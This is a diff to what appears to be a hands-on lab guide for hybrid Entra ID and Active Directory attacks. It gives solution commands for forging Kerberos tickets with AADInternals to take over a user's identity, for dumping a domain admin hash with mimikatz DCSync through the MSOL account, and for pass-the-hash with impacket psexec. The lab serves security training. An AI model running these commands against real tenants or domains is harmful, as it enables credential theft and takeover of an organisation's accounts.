@@ -12,10 +12,10 @@ Don't go so fast for the solution.. **try first!**
 
 # Start 
 
-## 1. Reconnaissance
+### 1. Reconnaissance
 Using AADInternals, do a bit of recon to find out the the tenant ID, and if the tenant has Seamless SSO turned on..
 
-You may explore https://aadinternals.com/aadinternals
+Hint: use https://aadinternals.com/aadinternals
 
 <details>
 <summary><b>Solution</b></summary>
@@ -58,20 +58,24 @@ See which users are Active Directory users that are synced to the cloud...
 <details>
 <summary><b>Hint 2</b></summary>
 
+Go the easier way:
+* Use AzureAD Powershell module (https://learn.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0)
+
+Go the advanced way (and learn how to use access tokens):
 1. Use AADInternals to get an access token for AAD Graph
-2. Use AzureAD Powershell module and connect using this token
+2. Use AzureAD Powershell module and connect using this token (https://learn.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0)
 
-```powershell
 
-```
 </details>
 
 <details>
 <summary><b>Hint 3</b></summary>
 
-The commands are:
+Hard way commands:
 1. ```Get-AADIntAccessTokenForAADGraph```
 1. ```Connect-AzureAD -AccountId $SyncUserUPN -TenantId $tenantId -AadAccessToken $at```
+
+if you went the easy way - figure it out yourself.
 </details>
 
 <details>
@@ -191,24 +195,59 @@ Set the victim user's SID:
 $victimUserSid = "S-1-5-21-CHANGEME" # set the sid of the user you wish to impersonate
 ```
 
-#### 4. Perform the attack
+#### 3. Perform the attack
 ```powershell
 # generate kerberos ticket
 $kerberos=New-AADIntKerberosTicket -SidString $victimUserSid -Hash $hash
 
 # get an access token for that user
-$at = Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain $domain".onmicrosoft.com"
+$at = Get-AADIntAccessTokenForMSGraph -KerberosTicket $kerberos -Domain $domain".onmicrosoft.com"
 # if you get AADSTS50079 error, it might mean you have a conditional access policy in your Entra tenant named "Security info registration for Microsoft partners and vendors" that blocks this login, you need to reinstall the entire lab from scratch and associate it yo your new tenant
 
-# start exploring using MS Graph API!
+# start exploring what you can do in the tenant using MS Graph API!
 $MaximumFunctionCount = 8192 # bypass powershell's scope memory limit
 Import-Module Microsoft.Graph.Users
 $securedAT = ConvertTo-SecureString $at -AsPlainText -Force
 Connect-MgGraph -AccessToken $securedAT
 
+Get-MgContext
+
 Get-MgUser
-#Readme: https://aka.ms/graph/sdk/powershell
 #SDK Docs: https://aka.ms/graph/sdk/powershell/docs
-#API Docs: https://aka.ms/graph/docs
 ```
-What can you do now that you are an Application Administrator?
+if you took the easy way earlier, take the hard one now!
+
+
+#
+### 6. Pass The Hash using Entra Connect's MSOL Account Attack
+
+Your goal: using the MSOL account creds, perform pass the hash attack, and open cmd.exe in the context of a domain admin user (that is *not* ``user1``). Do it in the **Win 11 VM**.
+
+* Use ``c:\lab\mimikatz`` and [impacket-psexec](https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe)
+
+<details>
+<summary><b>Solution</b></summary>
+
+```powershell
+
+# find a domain admin user to target
+Get-ADGroupMember 'domain admins' | select name,samaccountname
+
+# login in the context of MSOL account
+runas /user:YOUDOMAIN\MSOL_xxxxxx cmd.exe
+
+# dump rootuser's hash
+C:\lab\mimikatz\x64\mimikatz.exe "lsadump::dcsync /user:rootuser"
+
+# from a new cmd:
+
+.\psexec_windows.exe -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> YOUDOMAIN/rootuser@10.0.0.10 cmd
+
+ipconfig # see the IP is of DC VM
+
+```
+</details>
+
+
+#
+###  Good Job! Summarize yourself the attack paths you just took and the attacks you've learned!
